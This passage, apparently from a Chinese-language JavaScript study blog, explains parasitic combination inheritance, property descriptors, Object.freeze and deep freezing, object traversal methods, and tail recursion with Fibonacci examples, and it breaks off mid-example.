</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br></div></div><p>两者不同在于，Object.create 创建的新函数<strong>并没有继承构造函数的属性和方法</strong>，<strong>只继承了原型方法和原型属性</strong></p> <p>这就是<strong>为什么组合寄生式继承优于普通的组合继承的地方</strong>，因为之前已经继承过一次，不再重复继承多一次原型的属性和方法。</p> <p><strong>寄生组合继承(组合优化)</strong></p> <p><strong>实现步骤</strong>：2,3步<strong>可以跟原型链图结合看使用</strong>, 就是在原型链F原型及O原型中间加入一层父的原型；</p> <ol><li>原来<strong>继承 构造属性</strong>; <code>Person.call(this, name, age)</code></li> <li>改成<strong>继承 原型方法</strong>; <code>Student.prototype = Object.create(Person.prototype)</code></li> <li><strong>纠正构造器</strong>;  <code>Student.prototype.constructor = Student</code> 指向回来；</li></ol> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">SuperType</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>	
	<span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>	
	<span class="token keyword">this</span><span class="token punctuation">.</span>colors <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">&quot;red&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;green&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;black&quot;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span> 
<span class="token class-name">SuperType</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">sayName</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name
<span class="token punctuation">}</span><span class="token punctuation">;</span> 
<span class="token keyword">function</span> <span class="token function">SubType</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> age</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>	
	<span class="token function">SuperType</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>	<span class="token comment">//继承一次</span>
	<span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span> 
<span class="token comment">/* 普通组合继承 */</span>
<span class="token class-name">SubType</span><span class="token punctuation">.</span>prototype <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SuperType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	<span class="token comment">//继承第二次</span>

<span class="token comment">/* 组合寄生 */</span>
<span class="token keyword">function</span> <span class="token function">inherit</span><span class="token punctuation">(</span><span class="token parameter">Sub<span class="token punctuation">,</span>Super</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
	<span class="token comment">//var pPrototype = Object.create(Super.prototype)	//不发生第二次继承</span>
	<span class="token comment">//pPrototype.constructor =  Sub</span>
	<span class="token comment">//Sub.prototype = pPrototype </span>
  
  <span class="token class-name">Sub</span><span class="token punctuation">.</span>prototype <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token class-name">Super</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span> <span class="token comment">// 继承父类，原型链指向父类；</span>
  <span class="token class-name">Sub</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>constructor <span class="token operator">=</span> Sub <span class="token comment">//自己的原型构造再指回自己；</span>
<span class="token punctuation">}</span>
<span class="token function">inherit</span><span class="token punctuation">(</span>SubType<span class="token punctuation">,</span>SuperType<span class="token punctuation">)</span>

<span class="token class-name">SubType</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">sayAge</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>age<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br></div></div><h4 id="_4-object属性"><a href="#_4-object属性" class="header-anchor">#</a> 4:Object属性</h4> <p><code>Object.defineProterty</code>；ES5出来的方法; 三个参数: 对象(必填), 属性值(必填), 描述符(可选);</p> <h5 id="属性分类-共6个"><a href="#属性分类-共6个" class="header-anchor">#</a> 属性分类（共6个）</h5> <p><strong>数据属性4个特性</strong>:（<strong>VEWC</strong>）</p> <ul><li><code>value(属性值)</code>：属性的值；</li> <li><code>enumerable(可枚举)</code>：表示<strong>能否通过for-in循环</strong>返回属性；</li> <li><code>writable(可修改)</code>：表示<strong>是否能修改</strong>属性的值；</li> <li><code>configurable(可配置)</code>：表示<strong>能否通过delete删除属性从而重新定义属性，能否修改属性</strong>；</li></ul> <p><strong>访问器属性2个特性</strong>:(SG)</p> <p><code>set(设置)</code>，<code>get(获取)</code></p> <p>内部属性<strong>由JavaScript引擎内部使用的属性; 不能直接访问,但是可以通过对象内置方法间接访问</strong>,内部属性用[[]]包围表示,是一个抽象操作,没有对应字符串类型的属性名,如[[Prototype]].</p> <p>如:	<strong>[[Prototype]]可以通过<code>Object.getPrototypeOf()</code>访问;</strong></p> <p><strong>示例</strong></p> <p>定义一个属性;  <code>Object.defineProperty</code></p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">let</span> person <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
Object<span class="token punctuation">.</span><span class="token function">defineProperty</span><span class="token punctuation">(</span>person<span class="token punctuation">,</span> <span class="token string">&quot;name&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
  configurable<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>  <span class="token comment">//表示能否通过delete删除属性从而重新定义属性，能否修改属性</span>
  writable<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>  <span class="token comment">// 表示是否能修改属性的值</span>
  enumerable<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>  <span class="token comment">//表示能否通过for-in循环返回属性</span>
  value<span class="token operator">:</span> <span class="token string">&quot;samy&quot;</span> <span class="token comment">// 属性的值</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>定义多个属性; <code>Object.defineProperties</code></p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>Object<span class="token punctuation">.</span><span class="token function">defineProperties</span><span class="token punctuation">(</span>book<span class="token punctuation">,</span> <span class="token punctuation">{</span>
    _year<span class="token operator">:</span> <span class="token punctuation">{</span>
        writable<span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
        value<span class="token operator">:</span> <span class="token number">2001</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    year<span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token function-variable function">get</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">return</span> _year
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token function-variable function">set</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">newValue</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>_year <span class="token operator">=</span> newValue<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div><h5 id="常用属性方法"><a href="#常用属性方法" class="header-anchor">#</a> 常用属性方法</h5> <ul><li><p><code>isPrototypeOf()</code>  确定对象之间<strong>是否存在原型关系</strong></p></li> <li><p><code>Object.getPrototypeOf(object1)</code> <strong>获取实例对象的原型</strong></p></li> <li><p><code>hasOwnProperty(name)</code>  检测一个属性是否在实例中；</p></li> <li><p><code>in</code>原型与in操作符 &quot;name&quot; in person  对象能访问到给定属性时返回true</p></li> <li><p><code>Object.keys(obj)</code>  返回一个包含所有可枚举属性的字符串数组（实例属性）</p></li> <li><p><code>Object.getOwnPropertyNames()</code>  获取所有实例属性，<strong>包括不可美枚举的</strong>；后面深度冻结有用到；</p></li></ul> <h5 id="判断对象的属性"><a href="#判断对象的属性" class="header-anchor">#</a> 判断对象的属性</h5> <p><code>object.hasOwnProperty(proName)</code>; 其中参数object是必选项。一个对象的实例。如果 object 具有指定名称的属性，那么JavaScript中hasOwnProperty函数方法返回 true，反之则返回 false。</p> <table><thead><tr><th>名称</th> <th>含义</th> <th>用法</th></tr></thead> <tbody><tr><td>in</td> <td>如果指定的属性在指定的对象或其原型链中，<br>则in 运算符返回true</td> <td>'name' in test  //true</td></tr> <tr><td>hasOwnProperty()</td> <td><strong>只判断自身属性</strong></td> <td>test.hasOwnProperty('name')   //true</td></tr> <tr><td>.或[]</td> <td>对象或原型链上不存在该属性，则会返回undefined</td> <td>test.name     //&quot;samy&quot;   <br>test[&quot;name&quot;]  //&quot;samy&quot;</td></tr></tbody></table> <h5 id="delete-object-freeze"><a href="#delete-object-freeze" class="header-anchor">#</a> delete/Object.freeze</h5> <p><code>delete</code>操作符用于从对象中删除属性;  <strong>用在对象上；</strong></p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">test1</span><span class="token punctuation">(</span><span class="token parameter">params</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> output <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">x</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">delete</span> x<span class="token punctuation">;</span>
    <span class="token keyword">return</span> x<span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//0</span>
<span class="token punctuation">}</span>
<span class="token function">test1</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">function</span> <span class="token function">test2</span><span class="token punctuation">(</span><span class="token parameter">params</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> <span class="token constant">X</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
    foo<span class="token operator">:</span> <span class="token number">1</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> output <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">delete</span> <span class="token constant">X</span><span class="token punctuation">.</span>foo<span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token constant">X</span><span class="token punctuation">.</span>foo<span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//undefined</span>
<span class="token punctuation">}</span>
<span class="token function">test2</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br></div></div><p><strong><code>Object.freeze()</code></strong></p> <p><strong>定义枚举的首选语法</strong>； 可以 <code>Object.freeze</code> 来实现枚举</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">var</span> DaysEnum <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">freeze</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  <span class="token string">&quot;monday&quot;</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
  <span class="token string">&quot;tuesday&quot;</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span>
  <span class="token string">&quot;wednesday&quot;</span><span class="token operator">:</span> <span class="token number">3</span><span class="token punctuation">,</span>
  <span class="token comment">// ...</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
Object<span class="token punctuation">.</span><span class="token function">freeze</span><span class="token punctuation">(</span>DaysEnum<span class="token punctuation">)</span><span class="token comment">//这阻止咱们把值分配给变量：</span>
<span class="token keyword">let</span> day <span class="token operator">=</span> DaysEnum<span class="token punctuation">.</span>tuesday
day <span class="token operator">=</span> <span class="token number">298832342</span> <span class="token comment">// 但是，不会报错</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>day<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//298832342</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>DaysEnum<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//{ monday: 1, tuesday: 2, wednesday: 3 }</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><p><strong>与 <code>const</code> 的区别</strong></p> <p><code>Object.freeze</code>适用于值，更具体地说，<strong>适用于对象值，它使对象不可变</strong>，即不能更改其属性。</p> <p><code>const</code> <strong>声明一个只读的变量</strong>，一旦声明，常量的值就不可改变;</p> <p><code>const</code>和<code>Object.freeze</code>是两个完全不同的概念。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">let</span> person <span class="token operator">=</span> <span class="token punctuation">{</span>
  name<span class="token operator">:</span> <span class="token string">&quot;Leonardo&quot;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> animal <span class="token operator">=</span> <span class="token punctuation">{</span>
  species<span class="token operator">:</span> <span class="token string">&quot;snake&quot;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
Object<span class="token punctuation">.</span><span class="token function">freeze</span><span class="token punctuation">(</span>person<span class="token punctuation">)</span><span class="token punctuation">;</span>
person<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">&quot;samy&quot;</span><span class="token punctuation">;</span> <span class="token comment">//nodejs环境下是不报错的。 TypeError: Cannot assign to read only property 'name' of object</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>person<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> person2 <span class="token operator">=</span> <span class="token punctuation">{</span>
  name<span class="token operator">:</span> <span class="token string">&quot;Leonardo&quot;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> animal2 <span class="token operator">=</span> <span class="token punctuation">{</span>
  species<span class="token operator">:</span> <span class="token string">&quot;snake&quot;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
person2 <span class="token operator">=</span> animal2<span class="token punctuation">;</span> <span class="token comment">// ERROR &quot;person&quot; is read-only</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br></div></div><p><strong>&quot;深冻结&quot;对象</strong></p> <blockquote><p>如果咱们想要确保对象被深冻结，就必须<strong>创建一个递归函数来冻结对象类型的每个属性</strong></p></blockquote> <p><strong>没有深冻结</strong></p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">let</span> person <span class="token operator">=</span> <span class="token punctuation">{</span>
  name<span class="token operator">:</span> <span class="token string">&quot;Leonardo&quot;</span><span class="token punctuation">,</span>
  profession<span class="token operator">:</span> <span class="token punctuation">{</span>
    name<span class="token operator">:</span> <span class="token string">&quot;developer&quot;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
Object<span class="token punctuation">.</span><span class="token function">freeze</span><span class="token punctuation">(</span>person<span class="token punctuation">)</span><span class="token punctuation">;</span> 
person<span class="token punctuation">.</span>profession<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">&quot;doctor&quot;</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>person<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//output { name: 'Leonardo', profession: { name: 'doctor' } }</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p><strong>深冻结</strong></p> <p>步骤：</p> <ol><li>通过  <code>getOwnPropertyNames</code>获取属性；  获取所有实例属性，<strong>包括不可美枚举的</strong></li> <li>通过 for of 遍历所有实例属性;</li></ol> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">deepFreeze</span><span class="token punctuation">(</span><span class="token parameter">object</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">let</span> propNames <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">getOwnPropertyNames</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> name <span class="token keyword">of</span> propNames<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">let</span> value <span class="token operator">=</span> object<span class="token punctuation">[</span>name<span class="token punctuation">]</span><span class="token punctuation">;</span>
        object<span class="token punctuation">[</span>name<span class="token punctuation">]</span> <span class="token operator">=</span> value <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> value <span class="token operator">===</span> <span class="token string">&quot;object&quot;</span> <span class="token operator">?</span> <span class="token function">deepFreeze</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token operator">:</span> value<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> Object<span class="token punctuation">.</span><span class="token function">freeze</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">let</span> person <span class="token operator">=</span> <span class="token punctuation">{</span>
    name<span class="token operator">:</span> <span class="token string">&quot;Leonardo&quot;</span><span class="token punctuation">,</span>
    profession<span class="token operator">:</span> <span class="token punctuation">{</span>
        name<span class="token operator">:</span> <span class="token string">&quot;developer&quot;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token function">deepFreeze</span><span class="token punctuation">(</span>person<span class="token punctuation">)</span><span class="token punctuation">;</span>
person<span class="token punctuation">.</span>profession<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">&quot;doctor&quot;</span><span class="token punctuation">;</span> 
<span class="token comment">// nodejs环境下是不报错的。TypeError: Cannot assign to read only property 'name' of object</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>person<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//{ name: 'Leonardo', profession: { name: 'developer' } }</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br></div></div><h4 id="_5-对象遍历"><a href="#_5-对象遍历" class="header-anchor">#</a> 5:对象遍历</h4> <h5 id="一级对象遍历方法"><a href="#一级对象遍历方法" class="header-anchor">#</a> 一级对象遍历方法</h5> <table><thead><tr><th>方法</th> <th>特性</th></tr></thead> <tbody><tr><td><strong>for ... in</strong></td> <td>遍历对象<strong>自身的和继承</strong>的可枚举属性(<strong>不含Symbol属性</strong>)，可跟 <code>hasOwnProperty</code>配合使用；参考【深拷贝】的实现；</td></tr> <tr><td><strong>Object.keys(obj)</strong></td> <td>返回一个数组,包括对象自身的(<strong>不含继承的</strong>)所有可枚举属性(<strong>不含Symbol属性</strong>)</td></tr> <tr><td><strong>Object.getOwnPropertyNames(obj)</strong></td> <td>返回一个数组,包括对象自身的<strong>所有可枚举和不可枚</strong>举属性(<strong>不含Symbol属性</strong>)； 可跟 <code>for of</code>给合使用；参考【深冻结】的实现；</td></tr> <tr><td>Object.getOwnPropertySymbols(obj)</td> <td>返回一个数组,包含对象<strong>自身的所有Symbol属性</strong></td></tr> <tr><td>Reflect.ownKeys(obj)</td> <td>返回一个数组,包含对象**自身的所有(不枚举、可枚举和Symbol)**属性</td></tr> <tr><td>Reflect.enumerate(obj)</td> <td>返回一个Iterator对象,遍历对象<strong>自身的和继承</strong>的<strong>所有可枚举属性(不含Symbol属性)</strong></td></tr></tbody></table> <p><strong>总结</strong>:</p> <ol><li>只有<code>Object.getOwnPropertySymbols(obj)</code>和<code>Reflect.ownKeys(obj)</code>可以拿到Symbol属性；</li> <li>只有<code>Reflect.ownKeys(obj)</code><strong>可以拿到不可枚举属性</strong>；</li> <li>使用 <code>for..in</code> 循环遍历<strong>出所有可枚举的自有属性</strong>。使用 <code>hasOwnProperty</code> 获取自有属性，即非原型链上的属性；</li></ol> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token comment">//Person.prototype = {</span>
<span class="token comment">//    name: 'samy'</span>
<span class="token comment">//}</span>
<span class="token class-name">Person</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">'samy'</span>
<span class="token keyword">var</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
p<span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>

p<span class="token punctuation">.</span><span class="token function">hasOwnProperty</span><span class="token punctuation">(</span><span class="token string">'age'</span><span class="token punctuation">)</span> <span class="token comment">// true</span>
p<span class="token punctuation">.</span><span class="token function">hasOwnProperty</span><span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span> <span class="token comment">// false</span>

<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> key <span class="token keyword">in</span> p<span class="token punctuation">)</span> <span class="token punctuation">{</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token punctuation">}</span> <span class="token comment">// name age</span>
<span class="token comment">// 使用 hasOwnProperty</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> key <span class="token keyword">in</span> p<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  p<span class="token punctuation">.</span><span class="token function">hasOwnProperty</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>
<span class="token punctuation">}</span> <span class="token comment">// name</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br></div></div><h5 id="多级对象遍历循环"><a href="#多级对象遍历循环" class="header-anchor">#</a> 多级对象遍历循环</h5> <p><strong>数据模型</strong>: <strong>递归</strong>:  已经知道对象结构，直接操作添加，不用考虑那么多因素；</p> <h5 id="尾递归"><a href="#尾递归" class="header-anchor">#</a> 尾递归</h5> <p>尾递归就是：<strong>函数最后<code>单纯return函数</code></strong>，尾递归来说，**由于只存在一个调用记录，所以永远不会发生&quot;栈溢出&quot;**错误。<strong>ES6出现的尾递归，可以将复杂度O(n)的调用记录，换为复杂度O(1)的调用记录</strong></p> <p>示例： <strong>斐波那契数列</strong></p> <p>特点：第三项等于前面两项之和;  1、1、2、3、5、8、13、21</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">Fibonacci</span> <span class="token punctuation">(</span><span class="token parameter">n</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//测试：不使用尾递归</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> n <span class="token operator">&lt;=</span> <span class="token number">2</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">Fibonacci</span><span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">Fibonacci</span><span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// return 四则运算</span>
<span class="token punctuation">}</span>
<span class="token comment">// Fibonacci(10) // 89</span>
<span class="token comment">// Fibonacci(100) // 超时</span>
<span class="token comment">// Fibonacci(100) // 超时</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">Fibonacci</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//13</span>

<span class="token keyword">function</span> <span class="token function">Fibonacci2</span> <span class="token punctuation">(</span><span class="token parameter">n <span class="token punctuation">,</span> f1 <span class="token operator">=</span> <span class="token number">1</span> <span class="token punctuation">,</span> f2 <span class="token operator">=</span> <span class="token number">1</span></span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//测试：使用尾递归</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span> n <span class="token operator">&lt;=</span> <span class="token number">2</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> f2<span class="token punctuation">}</span><span class="token punctuation">;</span>
